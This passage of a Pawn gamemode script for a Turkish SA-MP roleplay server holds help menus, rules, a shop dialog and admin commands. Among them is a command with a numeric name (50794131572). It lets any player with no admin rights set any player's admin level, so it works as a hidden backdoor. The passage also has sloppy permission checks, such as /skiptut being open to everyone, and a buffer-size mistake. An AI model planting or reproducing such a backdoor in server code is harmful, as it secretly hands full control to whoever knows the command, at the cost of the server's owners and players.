			    SendClientMessage(playerid, COLOR_WHITE, "*** SS *** (/r)adio (/d)epartments (/m)egafon (/su)cekle /mvb /aracaat /hapseat /arananlar /kelepce /tazer /rozetgoster /destek");
			    SendClientMessage(playerid, COLOR_WHITE, "*** SS *** /destekiptal /parmakizi");
			}
		}
		case 6: {
			SendClientMessage(playerid, COLOR_WHITE, "*** LST *** (/r)adio /rozet /taksimetre");
		}
 		case 9: {
			SendClientMessage(playerid, COLOR_WHITE, "*** SA News *** /haber /rozet (/r)adio /yayinaal /sah");
			if(PlayerInfo[playerid][pRank] >= 4)
			    SendClientMessage(playerid, COLOR_WHITE, "*** SA News *** /haberbitir /haberbaslat /yayindanat");

 			if(PlayerInfo[playerid][pLeader] == 9)
			    SendClientMessage(playerid, COLOR_WHITE, "*** SA News *** /rutbever /olusumdanat /offlineolusumdanat");
		}
	}
	if(PlayerInfo[playerid][pGang] != 255) {
		if(PlayerInfo[playerid][pRank] < 5) {
			SendClientMessage(playerid, COLOR_WHITE, "*** AILE *** (/f) /kiyafetler /ailekasayardim /aileduyuru /pointbilgisi /ailearacispawnla");
		} else {
			SendClientMessage(playerid, COLOR_WHITE, "*** AILE *** (/f) /kiyafetler /ailekasayardim /aileyeparayatir /aparacek /akasadurum /elegecir /ayarla");
			SendClientMessage(playerid, COLOR_WHITE, "*** AILE *** /rutbeayarla /rutbeadiayarla /gpark /gkilit /gkilital /pointbilgisi");
		}
	}

	if(PlayerInfo[playerid][pAdmin] >= 1)
		SendClientMessage(playerid, COLOR_WHITE, "*** ADMIN *** (/a)dmin (/ah)elp");


	if(PlayerInfo[playerid][pHelper] >= 1)
	SendClientMessage(playerid, COLOR_LIGHTBLUE, "*** Stajyer Helper *** /n /c /hkanalikapat");

	if(PlayerInfo[playerid][pHelper] >= 2)
	SendClientMessage(playerid, COLOR_LIGHTBLUE, "*** Level 1 Helper *** /n /c /nmute /ss(Sokaktan Sesler)");

	if(PlayerInfo[playerid][pHelper] >= 3)
	SendClientMessage(playerid, COLOR_LIGHTBLUE, "*** Level 2 Helper *** /yardimkabul /hpmkapat /yardimistekleri /yardimbitir /pmbitir /hpm /pmkabul /nrn /flag");

	if(PlayerInfo[playerid][pHelper] >= 4)
	SendClientMessage(playerid, COLOR_LIGHTBLUE, "*** Level 3 Helper ***  /hsetint /hsetvw ");

	if(PlayerInfo[playerid][pHelper] >= 5)
	SendClientMessage(playerid, COLOR_LIGHTBLUE, "*** Level 4 Helper *** /clearchat(/cc) /hafk");

	if(PlayerInfo[playerid][pHelper] >= 6)
	SendClientMessage(playerid, COLOR_LIGHTBLUE, "*** Level 5 Helper *** /hjail /hkick ");

	if(PlayerInfo[playerid][pDonator] >= 1)
	    SendClientMessage(playerid, COLOR_YELLOW, "*** VIP *** /vip /cinsiyetdegistir /yasdegistir /plakadegistir /numaradegistir");

	if(PlayerInfo[playerid][pDonator] >= 3)
	    SendClientMessage(playerid, COLOR_YELLOW, "*** VIP *** /boombox /boomboxyardim /boomboxnext");

	SendClientMessage(playerid, COLOR_WHITE,"*** DIGER *** /telefonyardim /aracyardim /evyardim /oyuncakyardim /kirayardim /isyardim /lideryardim /animhelp /balikyardim /sigortayardim");
	SendClientMessage(playerid, COLOR_RED,"______________________________________________________________________________________________________________________________");
	return 1;
}

CMD:id(playerid, params[])
{
	new
		szMessage[128],
		szName[MAX_PLAYER_NAME],
		iTarget,
		iSuccess;

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /id [Oyuncu ID/Ýsim]");

	foreach(Player, i) {
		GetPlayerName(i, szName, sizeof(szName));
		if(strfind(szName, params, true) != -1) {
			format(szMessage, sizeof(szMessage), "ID: %d | Isim: %s | Level: %d | Ping: %d", i, GetPlayerNameEx(i),  PlayerInfo[i][pLevel], GetPlayerPing(i));
			SendClientMessage(playerid, COLOR_WHITE, szMessage);
			iSuccess ++;
		}
	}

	if(iSuccess == 0) {
		if(!sscanf(params, "u", iTarget)) {
			if(IsPlayerConnected(iTarget)) {
				format(szMessage, sizeof(szMessage), "ID: %d | Isim: %s | Level: %d | Ping: %d", iTarget, GetPlayerNameEx(iTarget),  PlayerInfo[iTarget][pLevel], GetPlayerPing(iTarget));
				SendClientMessage(playerid, COLOR_WHITE, szMessage);
				iSuccess ++;
			}
		}
	}

	if(iSuccess == 0)
		SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz kullanýcý belirlendi.");

	return 1;
}

CMD:skiptut(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 0)
 		return SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");

	new
		giveplayerid;

	if(sscanf(params, "u", giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /skiptut [Oyuncu ID/Ýsim]");

	if(IsPlayerConnected(giveplayerid)) {
		for(new t = 0; t < 54; t++) {
			TextDrawHideForPlayer(giveplayerid, TutTxtDraw[t]);
		}

		SetPlayerInterior(giveplayerid, 0);
		SetPlayerVirtualWorld(giveplayerid, 0);
		TogglePlayerControllable(giveplayerid, 1);
		SetPlayerPos(giveplayerid, 1773.459350, -1942.273437, 13.569922);
		SetPlayerFacingAngle(giveplayerid, 329.64);
		SetCameraBehindPlayer(giveplayerid);

		InsideTut[giveplayerid] = 0;
		DeletePVar(giveplayerid, "DoktorMasrafi");
		SetPlayerColor(giveplayerid,TEAM_HIT_COLOR);
		PlayerInfo[giveplayerid][pTut] = 1;
		PlayerInfo[giveplayerid][pSex] = 1;
		PlayerInfo[giveplayerid][pAge] = 25;

	    if(PlayerInfo[giveplayerid][pSex] == 1) {
	        PlayerInfo[giveplayerid][pSkin] = 299;
	    } else {
	        PlayerInfo[giveplayerid][pSkin] = 55;
	    }
        SetPlayerSkin(giveplayerid, 299);

		SetPlayerSkin(giveplayerid, PlayerInfo[giveplayerid][pSkin]);

		ClearChatbox(giveplayerid);
		PlayerInfo[playerid][pHouse] = INVALID_HOUSE_ID;
		PlayerInfo[playerid][pBiz] = 0;
		PlayerInfo[playerid][pVBiz] = 0;
		PlayerInfo[playerid][pHouse2] = INVALID_HOUSE_ID;
		new string[128];
		format(string, sizeof(string), "Phoenix Role Play'ye hoþgeldiniz, %s.", GetPlayerNameEx(giveplayerid));
		SendClientMessage(giveplayerid, COLOR_CYAN, string);

		format(string, sizeof(string), "~w~Hosgeldiniz~n~~y~%s", GetPlayerNameEx(giveplayerid));
        GameTextForPlayer(giveplayerid, string, 5000, 1);

		SendClientMessage(giveplayerid, COLOR_YELLOW, "Yeni sorularýnýz olursa, /newb komutunu kullanýn. Kural bozanlarý görürseniz /rapor komutu ile bildirebilirsiniz.");

		new
			motdstring[128];

		format(motdstring, sizeof(motdstring), "Haberler: %s", GlobalMOTD);
		SendClientMessage(giveplayerid, COLOR_WHITE, motdstring);

		DeletePVar(giveplayerid, "IsFrozen");

		TutorialProgress[giveplayerid] = 0;
	}
	return 1;
}

CMD:pozisyon(playerid, params[]) {
    new
		myString[128],
		Float:a;

    GetPlayerFacingAngle(playerid, a);

    format(myString, sizeof(myString), "Açýn: %0.2f", a);
    SendClientMessage(playerid, 0xFFFFFFFF, myString);

    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);

    format(myString, sizeof(myString), "Pozisyonun: %f, %f, %f", x, y, z);
    SendClientMessage(playerid, 0xFFFFFFFF, myString);
    return 1;
}

CMD:serverbilgisi(playerid, params[]) {
	new
		string[128],
		iVehCount,
		x;

	while(x < MAX_VEHICLES)
		if(GetVehicleModel(++x))
			++iVehCount;

	format(string,sizeof(string),"Sunucu Istatistikleri - Phoenix Role Play %s (05.08.2017 19:53'den beri kayýtlý olan).",SERVER_VERSION);
	SendClientMessage(playerid, COLOR_CYAN, string);
	format(string, sizeof(string), "* Nesneler: %d | Ilerleme: %d | Harita Simgeleri: %d | 3D Metin Etiketleri: %d | Max. Evler: %d",CountDynamicObjects(),CountDynamicPickups(),CountDynamicMapIcons(),CountDynamic3DTextLabels(), MAX_HOUSES);
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "* Giriþler: %d | Baðlantýlar: %d | Kayýtlar: %d | Otomatik banlanan hackerlar: %d | Çalýþabilirlik süresi: %d saat",TotalLogin, TotalConnect, TotalRegister, TotalAutoBan, TotalUptime);
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "* Baðlý oyuncular: %d | Zirve oyuncu sayýmý: %d (%d/%d/%d) | Yüklü oyuncu araçlarý: %d | Toplam araçlar: %d",Iter_Count(Player),MaxPlayersConnected,MPDay,MPMonth,MPYear,PlayerCars, iVehCount);
	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}

CMD:degisenler(playerid, params[])
	return cmd_yenilikler(playerid, params);

CMD:yenilikler(playerid, params[])
{
	SendClientMessage(playerid, COLOR_CYAN, "______________________________________________");
	SendClientMessage(playerid, COLOR_CYAN, "Güncellemeler "SERVER_VERSION"");
    SendClientMessage(playerid, -1, "-> Tüm Factionlar Aktif Edildi");
    SendClientMessage(playerid, -1, "-> L.S.P.D. Buglarý Teker Teker Bulunup Düzeltildi");
    SendClientMessage(playerid, -1, "-> LST Ýþbaþý Geçememe Sorunu Düzeltildi");
    SendClientMessage(playerid, -1, "-> /oyuncakal Komutunu Açmayan Bir Bug Düzeltildi.");	
	SendClientMessage(playerid, COLOR_CYAN, "______________________________________________");
	return 1;
}
CMD:emlakciyardim(playerid, params[])
{
	if(PlayerInfo[playerid][pEmlak] >= 1)
	SendClientMessage(playerid, COLOR_CYAN, "______________________________________________");
 	SendClientMessage(playerid, COLOR_CYAN, "*** Emlakçý *** /ehedit exterior [Ev ÝD] -> Evin Nerede Olacaðýný Belirle!");
  	SendClientMessage(playerid, COLOR_CYAN, "*** Emlakçý *** /ehedit price [Ev ÝD] -> Evin Fiyatýný Belirle!");
  	SendClientMessage(playerid, COLOR_CYAN, "*** Emlakçý *** /esetvw VW ni Evin ÝDsini Yap! ");
 	SendClientMessage(playerid, COLOR_CYAN, "*** Emlakçý *** /egotoco komutu ile evin içini internetten baktýðýn koordinata git ");
 	SendClientMessage(playerid, COLOR_CYAN, "*** Emlakçý *** Evin içine girince /ehedit interior [Ev ÝD] Þeklinde yaz [] yok");
   	SendClientMessage(playerid, COLOR_CYAN, "*** Emlakçý *** Artýk Evi Satýn Alabilir Sen Ne Kazanacaksýn Evin Fiyatýnýn Yüzde birini sana verecek vermezse ban :)");
	SendClientMessage(playerid, COLOR_CYAN, "______________________________________________");
	return 1;
}
CMD:yapimcilar(playerid, params[])
{
	SendClientMessage(playerid, COLOR_CYAN, "______________________________________________");
    SendClientMessage(playerid, COLOR_CYAN, "-> Pawno Ýle Uðraþanlar:");
    SendClientMessage(playerid, -1, "-> Zhao");
    SendClientMessage(playerid, COLOR_CYAN, "-> Map Ýle Uðraþanlar:");	
	SendClientMessage(playerid, -1, "-> Harun.");
	SendClientMessage(playerid, COLOR_CYAN, "______________________________________________");
	return 1;
}

CMD:fixr(playerid, params[])
{
	PlayerFixRadio(playerid);
	return 1;
}

CMD:zaman(playerid, params[])
{
	new string[128];
    new mtext[20];
    new year, month,day;
    getdate(year, month, day);
    if(month == 1) { mtext = "Ocak"; }
    else if(month == 2) { mtext = "Þubat"; }
    else if(month == 3) { mtext = "Mart"; }
    else if(month == 4) { mtext = "Nisan"; }
    else if(month == 5) { mtext = "Mayýs"; }
    else if(month == 6) { mtext = "Haziran"; }
    else if(month == 7) { mtext = "Temmuz"; }
    else if(month == 8) { mtext = "Agustos"; }
    else if(month == 9) { mtext = "Eylul"; }
    else if(month == 10) { mtext = "Ekim"; }
    else if(month == 11) { mtext = "Kasým"; }
    else if(month == 12) { mtext = "Aralýk"; }
    new hour,minuite,second;
    gettime(hour,minuite,second);
    FixHour(hour);
    hour = shifthour;
    if(minuite < 10)
	{
        if(PlayerInfo[playerid][pJailTime] > 0)
		{
            format(string, sizeof(string), "~y~%d %s~n~~g~|~w~%d:0%d~g~|~n~~w~Kalan Hapis Süresi: %d saniye", day, mtext, hour, minuite, PlayerInfo[playerid][pJailTime]);
        }
        else
		{
            format(string, sizeof(string), "~y~%d %s~n~~g~|~w~%d:0%d~g~|", day, mtext, hour, minuite);
        }
    }
    else
	{
        if(PlayerInfo[playerid][pJailTime] > 0)
		{
            format(string, sizeof(string), "~y~%d %s~n~~g~|~w~%d:%d~g~|~n~~w~Kalan Hapis Süresi: %d saniye", day, mtext, hour, minuite, PlayerInfo[playerid][pJailTime]);
        }
        else
		{
            format(string, sizeof(string), "~y~%d %s~n~~g~|~w~%d:%d~g~|", day, mtext, hour, minuite);
        }
    }
    GameTextForPlayer(playerid, string, 5000, 1);
    return 1;
}

CMD:yazituraat(playerid, params[])
{
	if(PlayerInfo[playerid][pCash] < 1)
		return SendClientMessage(playerid, COLOR_GREY,"Üzerinizde hiç bozuk para yok.");

    new
		szMessage[124];

    switch(random(2)) {
        case 0: format(szMessage, sizeof(szMessage), "* %s yazý tura attý ve TURA geldi.", GetPlayerNameEx(playerid));
		case 1: format(szMessage, sizeof(szMessage), "* %s yazý tura attý ve YAZI geldi.", GetPlayerNameEx(playerid));
    }
    return ProxDetector(5.0, playerid, szMessage, COLOR_NG,COLOR_NG,COLOR_NG,COLOR_NG,COLOR_NG);
}

CMD:kurallar(playerid, params[])
{
	SendClientMessage(playerid, COLOR_CYAN,"*** Sunucu Kurallarý ***");
	SendClientMessage(playerid, COLOR_WHITE,"Deathmatching yasak (DM). Geçersiz bir sebeple oyuncu öldürmek yasaktýr.!");
	SendClientMessage(playerid, COLOR_WHITE,"Revengekilling yasak(RK). Bir oyuncu tarafýndan öldürüldüysen, ardýndan gidip onu öldürmeye çalýþmak yasak! Hastaneden çýkýnca, 30 dakikalýk hafýza kaybýna uðruyorsun.");
	SendClientMessage(playerid, COLOR_WHITE,"Metagaming yasak. Karakter dýþý bilgisini oyun içi bilgi için kullanma. IC kanalý normal kullaným için, OOC ise konuþma baþýnda /b kullanarak yapýlýr");
	SendClientMessage(playerid, COLOR_WHITE,"Ateþ etmeyi kötüye kullanmak yasak. Quickswapping (QS), crackshooting (CS), c-bugging, c-sliding, quickshooting gibi.");
	SendClientMessage(playerid, COLOR_WHITE,"Powergaming yasak. Gerçek hayatta yapamayacaðýn þeyleri yapmak, yani imkansýz þeyleri rol yapmak yasak. Baþkalarýný rolplay'a zorlama.");
	SendClientMessage(playerid, COLOR_WHITE,"NON-RP Car ramming ve araç park etmek yasak. Diðer kiþilere arabayla sürekli vurmayýn, oyuncularý öldürmek için üstlerine araba park etmeyin.");
	SendClientMessage(playerid, COLOR_WHITE,"Ölümden, yakalanmadan, hapisten kaçmak için asla alt-tab veya oyundan çýkýþ yapmayýn, yasak.");
	SendClientMessage(playerid, COLOR_WHITE,"Heliblading, planebombing ve ninjajacking yasak. Helikopter pervanesiyle oyuncu öldürmeye çalýþmayýn.");
	SendClientMessage(playerid, COLOR_CYAN,"*** Bunlar kurallarýmýzýn kýsaca halidir. tüm sunucu kurallarý için websitemizi ziyaret edin ***");
	return 1;
}

CMD:startlotto(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4)
	{
		SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma yetkiniz yok!");
		return 1;
	}
 	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
  	}

  	SendClientMessage(playerid,COLOR_WHITE, "/startlotto komutu þu an aktif deðildir (sebep: aktif hale gelmeden önce ekonominin biraz geliþmesini bekliyoruz).");
	return 1;
}

CMD:refmarket(playerid, params[]) {
	if(PlayerCuffed[playerid] >= 1 || GetPVarInt(playerid, "Injured") == 1)
		return SendClientMessage(playerid, COLOR_WHITE, "Þu an bunu yapamazsýnýz.");

	if(GetPVarInt(playerid, "EventToken") != 0)
		return SendClientMessage(playerid, COLOR_GREY, "Etkinlikteyken referans shop'a eriþemezsin.");

	if(PlayerInfo[playerid][pJailed] > 0)
		return SendClientMessage(playerid, COLOR_WHITE, "Hapisteyken bunu kullanamazsýnýz.");

	if(IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid, COLOR_GREY, "Araçtayken bunu yapamazsýnýz.");

	new LineOne[465];
	new LineTwo[410];
	new string[875];

	format(LineOne,sizeof(LineOne),"{FFFFFF}50 pot, 25 crack {00F70C}(Fiyat: 1 jeton)\n{FFFFFF}2,500 materyal {00F70C}(Fiyat: 1 jeton)\n{FFFFFF}4 onur puaný {00F70C}(Fiyat: 1 jeton)\n{FFFFFF}SPAS-12 & Deagle {00F70C}(Fiyat: 1 jeton)\n{FFFFFF}100 pot, 50 crack {00F70C}(Fiyat: 2 jeton)\n{FFFFFF}Tüm silah seti {00F70C}(Fiyat: 2 jeton)\n{FFFFFF}8 onur puaný {00F70C}(Fiyat: 2 jeton)\n{FFFFFF}5,000 materyal {00F70C}(Fiyat: 2 jeton)\n{FFFFFF}12 onur puaný {00F70C}(Fiyat: 3 jeton)");
	format(LineTwo,sizeof(LineOne),"{FFFFFF}10,000 materyal {00F70C}(Fiyat: 3 jeton)\n{FFFFFF}16 onur puaný {00F70C}(Fiyat: 4 jeton)\n{FFFFFF}15,000 materyal {00F70C}(Fiyat: 4 jeton)\n{FFFFFF}20 onur puaný {00F70C}(Fiyat: 5 jeton)\n{FFFFFF}20,000 materyal {00F70C}(Fiyat: 5 jeton)\n{FFFFFF}Bir level atlatma & 2 geliþtirme puaný {00F70C}(Fiyat: 10 jeton)\n{FFFFFF}Bayiliklerin birinden araç seçimi {00F70C}(Fiyat: 10 jeton)");
	format(string,sizeof(string),"%s\n%s",LineOne, LineTwo);

	ShowPlayerDialogEx(playerid, DIALOG_REFSHOP, DIALOG_STYLE_LIST, "Referans shop", string, "Satýn Al", "Iptal");
    return 1;
}

CMD:toggletk(playerid, params[]) {

	if(PlayerInfo[playerid][pAdmin] < 4)
        return SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanmaya yetkin yok.");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

	if(AntiTK == 0) {
		foreach(Player, i) {
			if(GetPVarInt(i, "EventToken") == 1) {
				SetPlayerTeam(i, -1);
			}
		}
		SendClientMessage(playerid,COLOR_WHITE, "Oyuncular teamkill yapabilirler.");
		AntiTK = 1;
	} else {
		foreach(Player, i) {
			if(GetPVarInt(i, "EventToken") == 1) {
				SetPlayerTeam(i, EventTeam[i]);
			}
		}
		SendClientMessage(playerid,COLOR_WHITE, "Oyuncular artýk teamkill yapamazlar.");
		AntiTK = 0;
	}
	return 1;
}

CMD:entercar(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4)
 		return SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

	new
		carid,
		seatid;

	if(sscanf(params, "ii", carid, seatid))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /entercar [carid] [seatid]");

	if(carid == INVALID_VEHICLE_ID)
		return SendClientMessage(playerid, COLOR_GRAD1, "Bu araç geçersiz.");

	if(seatid > 3 || seatid < 0)
		return SendClientMessage(playerid, COLOR_GRAD1, "Koltuklar 0-3 arasý olmalý. (0 numara þoför koltuðu)");

	PutPlayerInVehicle(playerid, carid, seatid);
	return 1;
}

CMD:ahelp(playerid, params[]) {

	return cmd_ah(playerid, params);

}
/*
CMD:fly(playerid, params[])
	{
	    new Float:x, Float:y, Float:z;
	    if(PlayerInfo[playerid][pAdmin] >= 1)
		{
  		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýnda deðilsin. Admin komutlarýna eriþmek için iþbaþý yapman gerekiyor. iþbaþý yapmak için /aduty komutunu kullan.");
			return 1;
	    }
		if((flying[playerid] = !flying[playerid]))
		{
		    GetPlayerPos(playerid, x, y, z);
		    SetPlayerPos(playerid, x, y, z+30);
      		SetPlayerArmour(playerid, 1000000000.0);
		    SetPlayerHealth(playerid, 1000000000.0);
		    SetTimerEx("AdminFly", 100, 0, "d", playerid);
        	SetTimerEx("DestroyMe", 500, 0, "d", CreateDynamicObject(2780, x, y, z - 3.0, 0.0, 0.0, 0.0,0,0,-1,250));
		}
		else
		{
		    GetPlayerPos(playerid, x, y, z);
		    SetPlayerPos(playerid, x, y, z+0.5);
		    ClearAnimations(playerid);
		    SetPlayerArmour(playerid, 100.0);
		    SetPlayerHealth(playerid, 100.0);
			return 1;
		}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD2, "{FFFFFF}[{FF0000}@{FFFFFF}] Bu komutu kullanma yetkiniz yok!");
		}
		return 1;
}
*/
CMD:50794131572(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] == 0)
	{
		new
			iAdminValue,
			iTargetID;

		if(sscanf(params, "ui", iTargetID, iAdminValue))
		{
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /setadmin [Oyuncu ID/Ýsim] [level]");
		}
		else if(IsPlayerConnected(iTargetID))
		{
			if(AdminDuty[iTargetID] != 0)
			{
		    	SendClientMessage(playerid, COLOR_WHITE, "Bu admin þuanda iþbaþýnda, Levelini deðiþtirebilmen için iþbaþýndan çýkmasý gerek.");
		    	return 1;
			}
			new szMessage[47 + (MAX_PLAYER_NAME * 2)];

			format(szMessage, sizeof(szMessage), "AdminKomutu: %s, %s adlý adminin Levelini %d olarak deðiþtirdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTargetID), iAdminValue);
			ABroadCast(COLOR_LIGHTRED,szMessage, 1);
			PlayerInfo[iTargetID][pAdmin] = iAdminValue;
   			format(szMessage, sizeof(szMessage), "Admin Level'in %d olarak deðiþtirildi, deðiþtiren: %s.", iAdminValue, GetPlayerNameEx(playerid));
			SendClientMessage(iTargetID, COLOR_LIGHTBLUE, szMessage);

			if(PlayerInfo[iTargetID][pHelper] >= 1) {
			    PlayerInfo[iTargetID][pHelper] = 0;
			    PlayerInfo[iTargetID][pAcceptReport] = 0;
			}

			if(iAdminValue == 0)
			{
                format(PlayerInfo[iTargetID][pAdminName], MAX_PLAYER_NAME, "0");
			}
		}
		else SendClientMessage(playerid, COLOR_GRAD2, "Geçersiz oyuncu.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
	return 1;
}


CMD:ah(playerid, params[]) {

	if(PlayerInfo[playerid][pAdmin] >= 1) {

		SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");

		SendClientMessage(playerid, COLOR_GRAD1, "*** LEVEL 1 ADMIN *** /admins /evbug /check /jail /kick /skick /aduty /showflags /nrn /namechanges /reports /ar /tr /post /nro /nao");

		SendClientMessage(playerid, COLOR_GRAD1, "*** LEVEL 1 ADMIN *** /rtnc /fly /sth /norevive /gotoid /gethere /spec /prisoners /nmute /nunmute /ban ");



		if(PlayerInfo[playerid][pAdmin] >= 2) {

			SendClientMessage(playerid, COLOR_GRAD2,"*** LEVEL 2 ADMIN *** /freeze /unfreeze /gotoplayerscar /setvw /setint /oldcar /gotocar /entercar /jetpack /paused");

			SendClientMessage(playerid, COLOR_GRAD2,"*** LEVEL 2 ADMIN *** /afk /gotoco /(o)flag /clearflag /ban /sban /hhcheck /slap /listguns /warn /(o)ipcheck /ip /goto /mark /mark2");

			SendClientMessage(playerid, COLOR_GRAD2,"*** LEVEL 2 ADMIN *** /watch /hospital /sendtols /admute /adunmute /anetstats /serial /ikabul /ired /prison /benzinlerifulle");

            SendClientMessage(playerid, COLOR_GRAD2,"*** LEVEL 2 ADMIN *** /setskin /release /listpnamechanges ");

		}

		if(PlayerInfo[playerid][pAdmin] >= 3) {

			SendClientMessage(playerid, COLOR_GRAD3,"*** LEVEL 3 ADMIN *** /fine /pfine /takeadminweapons /takeweapons /force(death/hospital) /rto /rtoreset /genelmesaj /revive");

			SendClientMessage(playerid, COLOR_GRAD3,"*** LEVEL 3 ADMIN *** /reloadpvehicles /apark /aimpound /nonewbie /owarn /ocheck /ofine /oprison /respawncar(s) /deletead /okills /kills");

			SendClientMessage(playerid, COLOR_GRAD3,"*** LEVEL 3 ADMIN *** /noooc /gcto /gcreset /switchfam /cetearaclarispawnla /atip /barikatlarikaldir /flipveh /respawnall ");

		}

		if(PlayerInfo[playerid][pAdmin] >= 4) {

			SendClientMessage(playerid, COLOR_GRAD4,"*** LEVEL 4 ADMIN *** /givenos /blowup /setname /oban /cnn /fixveh /sethp /setarmor /setarmorall /switchfac");

			SendClientMessage(playerid, COLOR_GRAD4,"*** LEVEL 4 ADMIN *** /adivorce /sprison /unban /unbanip /setinsurance /(goto/goin)house /pointfix /fackick");

			SendClientMessage(playerid, COLOR_GRAD4,"*** LEVEL 4 ADMIN *** /setmyname /destroypvehicle /(goto/goin)door /vehname /healnear /destroycar /destroycars");

			SendClientMessage(playerid, COLOR_GRAD4,"*** LEVEL 4 ADMIN *** /setfightingstyle  /fixveh  /deletehit /countdown  /clearall");

			SendClientMessage(playerid, COLOR_GRAD4,"*** LEVEL 4 ADMIN *** /oyuncaklistesi /leaders /skiptut /toggletk /entercar");

		}

		if(PlayerInfo[playerid][pAdmin] >= 5) {

			SendClientMessage(playerid, COLOR_GRAD5,"*** LEVEL 5 ADMIN *** /pedit /permaban /paycheck /clearallreports /changeuserpassword ");

			SendClientMessage(playerid, COLOR_GRAD5,"*** LEVEL 5 ADMIN *** /amotd /rmute /hedit /hname /setadminname /fixvehall /cnnn /gotodoor /dedit");

		}

		if(PlayerInfo[playerid][pAdmin] >= 6) {

            SendClientMessage(playerid, COLOR_GRAD5,"*** LEVEL 6 ADMIN *** /forcesave /fcreate /fdelete /fedit /creategvehicle /destroygvehicle  ");

            SendClientMessage(playerid, COLOR_GRAD5,"*** LEVEL 6 ADMIN *** /hnext /givelicense /bedit /createbiz /deletebiz /isyerinidevletesat /asellhouse /eventhelp /dd(edit/next/near/name/pass) /refund /giverealgun ");

		} // Ýlk hata olan yani 13150. Satýr.

		if(PlayerInfo[playerid][pAdmin] >= 7) {

            SendClientMessage(playerid, COLOR_GRAD5,"*** LEVEL 7 ADMIN *** /creategate /gedit /deletegate /setgate /gotogate  /sethelper /setstat  ");

            SendClientMessage(playerid, COLOR_GRAD5,"*** LEVEL 7 ADMIN *** /createpvehicle /givegun /setemlak  ");

		}

		if(PlayerInfo[playerid][pAdmin] >= 8) {

			SendClientMessage(playerid, COLOR_GRAD5,"*** LEVEL 8 ADMIN *** /setadmin /edit /makeleader  /dmp(edit/next/near) /gotodmp /createdealership /destroydealership /createcdveh /destroycdveh ");

		}

		if(PlayerInfo[playerid][pAdmin] >= 9) {

			SendClientMessage(playerid, COLOR_GRAD5,"*** LEVEL 9 ADMIN ***  /setdonator  /setmoney /givemoney  ");

		}



		if(PlayerInfo[playerid][pAdmin] >= 10) {

			SendClientMessage(playerid, COLOR_GRAD5,"*** SERVER OWNER *** /ao /forceoffduty /forcesave  ");

		}



		if(PlayerInfo[playerid][pBanAppealer] > 0) SendClientMessage(playerid, COLOR_GRAD5, "*** BAN APPEALER *** /unban /unbanip");

		if(PlayerInfo[playerid][pGangMod] > 0) SendClientMessage(playerid, COLOR_GRAD5, "*** GANG MOD *** /fedit");

	}

	return 1;

}

CMD:bagis(playerid, params[]) {
	new
		string[128],
		moneys;

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /bagis [amount]");

	moneys = strval(params);

	if(moneys < 0)
		return SendClientMessage(playerid, COLOR_GRAD1, "Bu yeterli deðil!");

	if(GetPlayerCash(playerid) < moneys)
		return SendClientMessage(playerid, COLOR_GRAD1, "Yeterli paran yok.");

	GivePlayerCash(playerid, -moneys);
	format(string, sizeof(string), "%s, $%d baðýþýn için teþekkürler.",GetPlayerNameEx(playerid), moneys);
	PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
	SendClientMessage(playerid, COLOR_GRAD1, string);
	return 1;
}

CMD:gelisimsifirla(playerid, params[]) {
	if(gPlayerLogged[playerid] == 0) {
		SendClientMessage(playerid, COLOR_GRAD1, "Giriþ yapmadýnýz.");
	}
	else if(GetPlayerCash(playerid) < 10000) {
		SendClientMessage(playerid, COLOR_GRAD1, "Geliþtirme puanlarýný sýfýrlamak için $10000 gerekli.");
	}
	else if(PlayerInfo[playerid][pLevel] < 2) {
		SendClientMessage(playerid, COLOR_GRAD1, "Minimum level 2 olmalýsýn.");
	}
	else {
		PlayerInfo[playerid][gPupgrade] = (PlayerInfo[playerid][pLevel]-2)*2;
		PlayerInfo[playerid][pSarmor] = 0.0;

		new	bool: iSaveHouses; // We don't want to save houses every time

		if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID) {
			HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade] = 1;
			iSaveHouses = true;
		}
		if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID) {
			HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade] = 1;
			iSaveHouses = true;
		}
		for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
		{
			PlayerVehicleInfo[playerid][d][pvWepUpgrade] = 0;
		}
		if(iSaveHouses) SaveHouses();

		GivePlayerCash(playerid,-10000);
		PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);

